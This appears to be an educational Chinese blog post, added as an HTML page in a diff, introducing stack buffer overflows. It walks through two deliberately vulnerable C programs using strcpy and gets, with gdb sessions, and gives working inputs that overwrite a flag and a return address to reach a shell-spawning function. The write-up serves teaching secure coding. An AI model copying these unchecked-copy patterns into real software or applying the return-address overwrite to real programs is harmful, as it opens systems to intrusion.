@@ -1,0 +1,595 @@
+
+ <!DOCTYPE HTML>
+<html >
+<head>
+  <meta charset="UTF-8">
+  
+    <title>缓冲区溢出初探 | 修竹幽晴堂</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="chendotjs">
+    
+
+    
+    <meta name="description" content="引言最近在读《C专家编程》，书中第二章提到了早期的gets()因为不检查缓冲区的空间，导致了1988年Internet蠕虫的爆发。为了兼容，虽然目前c语言I/O函数库仍然提供了gets()函数，但是官方手册强烈建议使用fgets替代gets。 1gets(line) ===&amp;gt; fgets(line, sizeof(line), stdin) 为了提醒自己和大家注重编码安全，本文将介绍两个最简">
+<meta name="keywords" content="c语言,汇编,反汇编,gdb,缓冲区溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="缓冲区溢出初探">
+<meta property="og:url" content="https://chendotjs.me/2017/05/04/缓冲区溢出初探/index.html">
+<meta property="og:site_name" content="修竹幽晴堂">
+<meta property="og:description" content="引言最近在读《C专家编程》，书中第二章提到了早期的gets()因为不检查缓冲区的空间，导致了1988年Internet蠕虫的爆发。为了兼容，虽然目前c语言I/O函数库仍然提供了gets()函数，但是官方手册强烈建议使用fgets替代gets。 1gets(line) ===&amp;gt; fgets(line, sizeof(line), stdin) 为了提醒自己和大家注重编码安全，本文将介绍两个最简">
+<meta property="og:updated_time" content="2017-07-27T06:26:24.828Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="缓冲区溢出初探">
+<meta name="twitter:description" content="引言最近在读《C专家编程》，书中第二章提到了早期的gets()因为不检查缓冲区的空间，导致了1988年Internet蠕虫的爆发。为了兼容，虽然目前c语言I/O函数库仍然提供了gets()函数，但是官方手册强烈建议使用fgets替代gets。 1gets(line) ===&amp;gt; fgets(line, sizeof(line), stdin) 为了提醒自己和大家注重编码安全，本文将介绍两个最简">
+
+    
+    <link rel="alternative" href="/atom.xml" title="修竹幽晴堂" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/cman.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/cman.png">
+    
+    <link rel="stylesheet" href="/css/style.css">
+    <link href='https://cdn.webfont.youziku.com/webfonts/nomal/107517/46953/59ac0d56f629d80bf07d56a1.css' rel='stylesheet' type='text/css' />
+    <link href='https://fonts.font.im/css?family=Marck+Script' rel='stylesheet' type='text/css'>
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/cman.png" alt="修竹幽晴堂" title="修竹幽晴堂"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name" style="font-family:yuweifced3d62f61a3fd"><a href="/" title="修竹幽晴堂">修竹幽晴堂</a></h1>
+				<h2 class="blog-motto" style="font-family: 'Marck Script', cursive;">Done is better than perfect!</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:chendotjs.me">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>
+</div>
+
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2017/05/04/缓冲区溢出初探/" title="缓冲区溢出初探" itemprop="url">缓冲区溢出初探</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="chendotjs" target="_blank" itemprop="author">chendotjs</a>
+		
+  <p class="article-time">
+    <time datetime="2017-05-04T04:56:45.000Z" itemprop="datePublished"> Published 2017-05-04</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#引言"><span class="toc-number">1.</span> <span class="toc-text">引言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实验环境"><span class="toc-number">2.</span> <span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#案例一-溢出修改变量的值"><span class="toc-number">3.</span> <span class="toc-text">案例一 溢出修改变量的值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#案例二-溢出修改返回地址"><span class="toc-number">4.</span> <span class="toc-text">案例二 溢出修改返回地址</span></a></li></ol>
+		
+		</div>
+		
+		<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>最近在读《C专家编程》，书中第二章提到了早期的<code>gets()</code>因为不检查缓冲区的空间，导致了1988年Internet蠕虫的爆发。为了兼容，虽然目前c语言I/O函数库仍然提供了<code>gets()</code>函数，但是<a href="http://man7.org/linux/man-pages/man3/gets.3.html" target="_blank" rel="external">官方手册</a>强烈建议使用<code>fgets</code>替代<code>gets</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gets(line) ===&gt; fgets(line, <span class="keyword">sizeof</span>(line), <span class="built_in">stdin</span>)</div></pre></td></tr></table></figure>
+<p>为了提醒自己和大家注重编码安全，本文将介绍两个最简单的缓冲区溢出例子，希望能让大家有防患未然的意识。</p>
+<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul>
+<li>系统： Archlinux x86_64</li>
+<li>编译器： gcc version 6.3.1 20170306</li>
+</ul>
+<h2 id="案例一-溢出修改变量的值"><a href="#案例一-溢出修改变量的值" class="headerlink" title="案例一 溢出修改变量的值"></a>案例一 溢出修改变量的值</h2><p>根据函数的栈帧布局，利用用户的输入可以覆盖掉一些局部变量，从而实现流程跳转。</p>
+<p>下面这个例子，在<code>verify_password</code>函数中进行<code>strcpy</code>操作而未对字符串长度进行检查，从而给溢出提供了发生的可能。我们在本例的目标是o利用<code>strcpy</code>让变量flag变成0。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//example1.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">"thOddjdlymTug"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span><span class="params">(<span class="keyword">char</span> *password)</span> </span>&#123;</div><div class="line">  <span class="keyword">int</span> flag;</div><div class="line">  <span class="keyword">char</span> buffer[<span class="number">8</span>];</div><div class="line">  flag = <span class="built_in">strcmp</span>(PASSWORD, password);</div><div class="line">  <span class="built_in">strcpy</span>(buffer, password);</div><div class="line">  <span class="comment">// then do something with buffer ...</span></div><div class="line">  <span class="keyword">return</span> flag;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">  <span class="keyword">int</span> valid_flag;</div><div class="line">  <span class="keyword">char</span> password[<span class="number">1024</span>];</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Please input password: "</span>);</div><div class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, password);</div><div class="line">  valid_flag = verify_password(password);</div><div class="line">  <span class="keyword">if</span> (valid_flag) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Incorrect password!\n"</span>);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Congratulations! You get the shell!\n"</span>);</div><div class="line">    execv(<span class="string">"/bin/bash"</span>, <span class="literal">NULL</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>先上一张图，函数<code>verify_password</code>的栈帧布局如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">|------------------------------------|  &lt;------- High address</div><div class="line">|            ...............         |</div><div class="line">|------------------------------------|</div><div class="line">|         parameter password         |</div><div class="line">|------------------------------------|</div><div class="line">|           return address           |</div><div class="line">|------------------------------------|        ---</div><div class="line">|    previous frame pointer(EBP)     |         |</div><div class="line">|------------------------------------| &lt;--EBP  |</div><div class="line">|                 flag               |         |  stack frame of verify_password</div><div class="line">|------------------------------------|         |</div><div class="line">|                buffer              |         |</div><div class="line">|------------------------------------| &lt;--ESP ---</div><div class="line">|            ...............         |</div><div class="line">|------------------------------------|  &lt;------- Low address</div></pre></td></tr></table></figure></p>
+<p>下面我们用gdb来跟踪一下程序内部的内存情况。</p>
+<p>先执行<code>gcc example1.c -g -o example1</code>生成可执行文件example1，然后执行<code>gdb example1</code>开始调试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">GNU gdb (GDB) 7.12.1</div><div class="line">Reading symbols from example1...done.</div><div class="line">(gdb) b 12</div><div class="line">Breakpoint 1 at 0x4006a6: file example1.c, line 12.</div><div class="line">(gdb) r</div><div class="line">Starting program: /tmp/example1</div><div class="line">Please input password: aabbccddeeffgghh</div><div class="line"></div><div class="line">Breakpoint 1, verify_password (password=0x7fffffffd650 &quot;aabbccddeeffgghh&quot;) at example1.c:12</div><div class="line">12        strcpy(buffer, password);</div><div class="line">(gdb) x/8gx $rsp</div><div class="line">0x7fffffffd620: 0x0000000000000017      0x00007fffffffd650</div><div class="line">0x7fffffffd630: 0x0000000000000000      0x00000013f7ffe0f0</div><div class="line">0x7fffffffd640: 0x00007fffffffda60      0x0000000000400700</div><div class="line">0x7fffffffd650: 0x6464636362626161      0x6868676766666565</div><div class="line">(gdb) p buffer+0</div><div class="line">$1 = 0x7fffffffd630 &quot;&quot;</div><div class="line">(gdb) p &amp;flag</div><div class="line">$2 = (int *) 0x7fffffffd63c</div><div class="line">(gdb) n</div><div class="line">14        return flag;</div><div class="line">(gdb) x/8gx $rsp</div><div class="line">0x7fffffffd620: 0x0000000000000017      0x00007fffffffd650</div><div class="line">0x7fffffffd630: 0x6464636362626161      0x6868676766666565</div><div class="line">0x7fffffffd640: 0x00007fffffffda00      0x0000000000400700</div><div class="line">0x7fffffffd650: 0x6464636362626161      0x6868676766666565</div><div class="line">(gdb) p flag</div><div class="line">$3 = 1751672679</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p>从上面的gdb调试可以看到，我们的输入<code>aabbccddeeffgghh</code>已经超过了buffer的8个字节，覆盖掉了整型变量flag的值。flag在内存里面是0x68686767，因为我的CPU是小端存储，所以flag的值就是0x68686767，也就是1751672679，一种很简单的利用printf命令的方法做验证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># chen @ localhost in ~ [15:04:42]</div><div class="line">$ printf %d 0x68686767</div><div class="line">1751672679%</div></pre></td></tr></table></figure></p>
+<p>这个时候我们就应该处心积虑得构造输入了。我们发现输入<code>aabbccddeeff</code>之后，进行<code>strcpy</code>操作，password字符串末尾的<code>&#39;\0&#39;</code>也会被复制过去，正好覆盖掉0x7fffffffd63b这个字节，所以让flag变为0，这样也就可以跳转到shell的分支里去。</p>
+<p>本例最后放一下结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># chen @ localhost in /tmp [15:16:22] C:130</div><div class="line">$ ./example1</div><div class="line">Please input password: aabbccddeeff</div><div class="line">Congratulations! You get the shell!</div><div class="line">[chen@localhost tmp]$</div></pre></td></tr></table></figure></p>
+<h2 id="案例二-溢出修改返回地址"><a href="#案例二-溢出修改返回地址" class="headerlink" title="案例二 溢出修改返回地址"></a>案例二 溢出修改返回地址</h2><p>在函数调用时，caller的栈帧都会保存callee返回后应该执行的下一条指令的地址，也就是返回地址，具体可以参考栈帧的结构。本例中main函数调用了getInput函数，getInput用了危险的<code>gets</code>函数，本例的目标是利用<code>gets</code>修改getInput返回后的下一条指令地址为authorized函数地址，从而得到shell。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//example1.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">"thOddjdlymTug"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">authorized</span><span class="params">()</span> </span>&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Congratulations! You get the shell!\n"</span>);</div><div class="line">  execv(<span class="string">"/bin/bash"</span>, <span class="literal">NULL</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">getInput</span><span class="params">()</span> </span>&#123;</div><div class="line">  <span class="keyword">char</span> buffer[<span class="number">8</span>];</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Please input password: "</span>);</div><div class="line">  gets(buffer);</div><div class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(PASSWORD, buffer) == <span class="number">0</span>) &#123;</div><div class="line">    authorized();</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">  getInput();</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>同样的套路，用gdb进行试探。</p>
+<p>首先对getInput函数进行反汇编：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble /rm getInput</div><div class="line">Dump of assembler code for function getInput:</div><div class="line">13      void getInput() &#123;</div><div class="line">   0x0000000000400636 &lt;+0&gt;:     55      push   %rbp</div><div class="line">   0x0000000000400637 &lt;+1&gt;:     48 89 e5        mov    %rsp,%rbp</div><div class="line">   0x000000000040063a &lt;+4&gt;:     48 83 ec 10     sub    $0x10,%rsp</div><div class="line"></div><div class="line">14        char buffer[8];</div><div class="line">15        printf(&quot;Please input password: &quot;);</div><div class="line">   0x000000000040063e &lt;+8&gt;:     bf 56 07 40 00  mov    $0x400756,%edi</div><div class="line">   0x0000000000400643 &lt;+13&gt;:    b8 00 00 00 00  mov    $0x0,%eax</div><div class="line">   0x0000000000400648 &lt;+18&gt;:    e8 93 fe ff ff  callq  0x4004e0 &lt;printf@plt&gt;</div><div class="line"></div><div class="line">16        gets(buffer);</div><div class="line">   0x000000000040064d &lt;+23&gt;:    48 8d 45 f0     lea    -0x10(%rbp),%rax</div><div class="line">   0x0000000000400651 &lt;+27&gt;:    48 89 c7        mov    %rax,%rdi</div><div class="line">   0x0000000000400654 &lt;+30&gt;:    b8 00 00 00 00  mov    $0x0,%eax</div><div class="line">   0x0000000000400659 &lt;+35&gt;:    e8 a2 fe ff ff  callq  0x400500 &lt;gets@plt&gt;</div><div class="line"></div><div class="line">17        if (strcmp(PASSWORD, buffer) == 0) &#123;</div><div class="line">   0x000000000040065e &lt;+40&gt;:    48 8d 45 f0     lea    -0x10(%rbp),%rax</div><div class="line">   0x0000000000400662 &lt;+44&gt;:    48 89 c6        mov    %rax,%rsi</div><div class="line">   0x0000000000400665 &lt;+47&gt;:    bf 6e 07 40 00  mov    $0x40076e,%edi</div><div class="line">   0x000000000040066a &lt;+52&gt;:    e8 81 fe ff ff  callq  0x4004f0 &lt;strcmp@plt&gt;</div><div class="line">   0x000000000040066f &lt;+57&gt;:    85 c0   test   %eax,%eax</div><div class="line">   0x0000000000400671 &lt;+59&gt;:    75 0a   jne    0x40067d &lt;getInput+71&gt;</div><div class="line"></div><div class="line">18          authorized();</div><div class="line">   0x0000000000400673 &lt;+61&gt;:    b8 00 00 00 00  mov    $0x0,%eax</div><div class="line">   0x0000000000400678 &lt;+66&gt;:    e8 99 ff ff ff  callq  0x400616 &lt;authorized&gt;</div><div class="line"></div><div class="line">19        &#125;</div><div class="line">20      &#125;</div><div class="line">   0x000000000040067d &lt;+71&gt;:    90      nop</div><div class="line">   0x000000000040067e &lt;+72&gt;:    c9      leaveq</div><div class="line">   0x000000000040067f &lt;+73&gt;:    c3      retq   </div><div class="line"></div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
+<p>可以看到authorized函数的地址为0x400616。</p>
+<p>在<code>strcmp</code>处设置断点，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">(gdb) b *0x000000000040065e</div><div class="line">Breakpoint 1 at 0x40065e: file example2.c, line 17.</div><div class="line">(gdb) r</div><div class="line">The program being debugged has been started already.</div><div class="line">Start it from the beginning? (y or n) y</div><div class="line">Starting program: /tmp/example2</div><div class="line">Please input password: aabbccddeeffgghhaabbcc      </div><div class="line"></div><div class="line">Breakpoint 1, getInput () at example2.c:17</div><div class="line">17        if (strcmp(PASSWORD, buffer) == 0) &#123;</div><div class="line">(gdb) x/8gx $rsp</div><div class="line">0x7fffffffda40: 0x6464636362626161      0x6868676766666565</div><div class="line">0x7fffffffda50: 0x0000636362626161      0x000000000040068e</div><div class="line">0x7fffffffda60: 0x00000000004006a0      0x00007ffff7a56511</div><div class="line">0x7fffffffda70: 0x00007ffff7dd0798      0x00007fffffffdb48</div><div class="line">(gdb) p buffer+0</div><div class="line">$1 = 0x7fffffffda40 &quot;aabbccddeeffgghhaabbcc&quot;</div></pre></td></tr></table></figure></p>
+<p>因为x86_64字节对齐的原因，我们的buffer被偷偷扩展成了16个字节的大小。0x7fffffffda50这一行最后的0x000000000040068e就是getInput函数返回之后下一条指令的地址，也就是<code>return 0；</code>这条语句，不信的话可以对main函数反汇编：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble /m main</div><div class="line">Dump of assembler code for function main:</div><div class="line">22      int main() &#123;</div><div class="line">   0x0000000000400680 &lt;+0&gt;:     push   %rbp</div><div class="line">   0x0000000000400681 &lt;+1&gt;:     mov    %rsp,%rbp</div><div class="line"></div><div class="line">23        getInput();</div><div class="line">   0x0000000000400684 &lt;+4&gt;:     mov    $0x0,%eax</div><div class="line">   0x0000000000400689 &lt;+9&gt;:     callq  0x400636 &lt;getInput&gt;</div><div class="line"></div><div class="line">24        return 0;</div><div class="line">   0x000000000040068e &lt;+14&gt;:    mov    $0x0,%eax</div><div class="line"></div><div class="line">25      &#125;</div><div class="line">   0x0000000000400693 &lt;+19&gt;:    pop    %rbp</div><div class="line">   0x0000000000400694 &lt;+20&gt;:    retq   </div><div class="line"></div><div class="line">End of assembler dump.</div><div class="line"></div><div class="line">(gdb)</div></pre></td></tr></table></figure></p>
+<p>这时候我们心里就有数了，只需要将0x000000000040068e覆盖成0x0000000000400616，就可以在getInput函数返回之后调用到authorized函数。注意到字符串结尾总是<code>&#39;\0&#39;</code>，不能只覆盖掉8e就以为万事大吉，这样会导致06被覆盖为00。</p>
+<p>因为没有办法（如果你知道请告诉我）在键盘输入不可见字符，只能用printf命令来模拟输入。</p>
+<p>最后放出利用方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># chen @ localhost in /tmp [16:00:01]</div><div class="line">$ printf &quot;aabbcc&quot; | ./example2  </div><div class="line">Please input password: %                                                                                                                                        </div><div class="line"># chen @ localhost in /tmp [16:00:04]</div><div class="line">$ printf &quot;aabbccddeeffgghhaabbccdd\x16\x06\x40&quot; | ./example2</div><div class="line">Please input password: Congratulations! You get the shell!</div></pre></td></tr></table></figure>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/c语言/">c语言</a><a href="/tags/汇编/">汇编</a><a href="/tags/反汇编/">反汇编</a><a href="/tags/gdb/">gdb</a><a href="/tags/缓冲区溢出/">缓冲区溢出</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="https://chendotjs.me/2017/05/04/缓冲区溢出初探/" data-title="缓冲区溢出初探 | 修竹幽晴堂" data-tsina="null" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2017/06/13/tigervnc-xfce4桌面安装/" title="tigervnc+xfce4桌面安装">
+  <strong>上一篇：</strong><br/>
+  <span>
+  tigervnc+xfce4桌面安装</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2017/04/28/从汇编角度看待函数调用/"  title="从汇编角度看待函数调用">
+ <strong>下一篇：</strong><br/> 
+ <span>从汇编角度看待函数调用
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+<section id="comments" class="comment">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#引言"><span class="toc-number">1.</span> <span class="toc-text">引言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实验环境"><span class="toc-number">2.</span> <span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#案例一-溢出修改变量的值"><span class="toc-number">3.</span> <span class="toc-text">案例一 溢出修改变量的值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#案例二-溢出修改返回地址"><span class="toc-number">4.</span> <span class="toc-text">案例二 溢出修改返回地址</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+<div class="github-card">
+<p class="asidetitle">Github Card</p>
+<div class="github-card" data-github="chendotjs" data-width="220" data-height="119" data-theme="medium">
+<script type="text/javascript" src="//cdn.jsdelivr.net/github-cards/latest/widget.js" ></script>
+</div>
+  </div>
+
+
+
+  
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/c语言/" title="c语言">c语言<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/linux/" title="linux">linux<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/汇编/" title="汇编">汇编<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/反汇编/" title="反汇编">反汇编<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/gdb/" title="gdb">gdb<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SDL2/" title="SDL2">SDL2<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/摄像头/" title="摄像头">摄像头<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/CI，-DevOps/" title="CI， DevOps">CI， DevOps<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/配置/" title="配置">配置<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/v4l2/" title="v4l2">v4l2<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Docker/" title="Docker">Docker<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/总结/" title="总结">总结<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/v8/" title="v8">v8<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/编译/" title="编译">编译<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/chrome/" title="chrome">chrome<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/hello-world/" title="hello world">hello world<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/javascript/" title="javascript">javascript<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/算法/" title="算法">算法<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/缓冲区溢出/" title="缓冲区溢出">缓冲区溢出<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/数据挖掘/" title="数据挖掘">数据挖掘<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://coolshell.cn" target="_blank" title="酷 壳">酷 壳</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://xiaoysec.github.io/" target="_blank" title="西土城马戏团">西土城马戏团</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://news.ycombinator.com/" target="_blank" title="Hacker News">Hacker News</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+<div class="linkslist">
+	<a href="http://s11.flagcounter.com/more/cb"><img src="http://s11.flagcounter.com/count2/cb/bg_FFFFFF/txt_000000/border_CCCCCC/columns_2/maxflags_10/viewers_0/labels_0/pageviews_0/flags_0/percent_0/" alt="Flag Counter" border="0"></a>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> A foo walks into a bar, <br/>
+			and says &quot;Hello Wold !&quot;</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		<a href="https://github.com/chendotjs" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
